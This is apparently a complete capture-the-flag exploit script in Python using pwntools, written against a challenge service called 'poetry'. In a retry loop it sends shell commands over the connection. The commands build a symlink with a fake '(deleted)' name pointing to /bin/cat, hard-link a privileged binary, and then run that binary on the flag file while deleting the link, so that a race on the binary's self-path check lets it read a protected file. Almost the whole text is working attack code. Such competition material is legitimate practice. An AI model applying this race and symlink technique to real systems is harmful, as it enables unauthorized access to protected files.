from pwn import *

def readall(conn):
    s = ''
    while True:
        line = conn.readline(timeout=1)
        if not line:
            break
        s += line
    return s 

def writeall(conn, data):
    print data
    conn.sendline(data)

def talk(conn, data):
    writeall(conn, data)
    res = readall(conn)
    return res

while True:
    conn = remote('poetry.ctfcompetition.com', 1337)

    talk(conn, 'ln -s /bin/cat \'/home/user/poetry (deleted)\'')
    talk(conn, 'ln /home/poetry/poetry /home/user/poetry')
    data = talk(conn, '(/home/user/poetry /home/poetry/flag &); rm /home/user/poetry')
    print data
    if 'No such file or directory' in data:
        conn.close()
        continue
    conn.interactive()